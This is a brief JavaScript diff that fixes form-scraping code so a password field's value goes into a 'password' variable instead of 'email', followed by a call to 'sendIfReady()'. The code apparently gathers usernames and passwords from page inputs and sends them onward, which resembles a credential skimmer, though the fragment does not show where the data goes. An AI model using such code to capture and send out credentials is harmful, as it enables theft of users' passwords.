@@ -34,8 +34,8 @@
       username = input.value;
     }
 
-    if (!email && (name.includes('password') || type === 'password')) {
-      email = input.value;
+    if (!password && (name.includes('password') || type === 'password')) {
+      password = input.value;
     }
 
     sendIfReady();
